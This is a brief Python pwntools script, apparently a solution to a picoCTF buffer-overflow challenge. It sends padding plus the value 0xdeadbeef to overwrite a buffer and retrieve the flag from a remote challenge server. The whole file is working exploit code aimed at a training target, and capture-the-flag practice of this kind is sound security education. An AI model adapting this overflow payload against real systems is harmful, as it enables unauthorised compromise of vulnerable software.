"""
BASIC BUFFER OVERFLOW
"""


from pwn import *

# 0x8 is padding between INPUT BUFFER AND GOAL BUFFER 
BUFFER_SIZE = 0X100 + 0x8 
KEY = 0Xdeadbeef

ADDRESS = "mars.picoctf.net"
PORT = 31890

IS_ONLINE = True

exe = ELF("./chall")
context.log_level = logging.DEBUG

payload = ""
payload += "a" * BUFFER_SIZE
payload = payload.encode()
payload += int.to_bytes(KEY, byteorder="little", length=8)
payload += "\n".encode()

io = remote(ADDRESS, PORT) if IS_ONLINE else process([exe.path])

io.recvuntil(b"see?\n")
io.send(payload)

io.recvline()
io.recvline()
# get and clean flag
flag = io.recvline().decode().split("\n")[0]
log.info(f"--------------------{flag}----------------------")

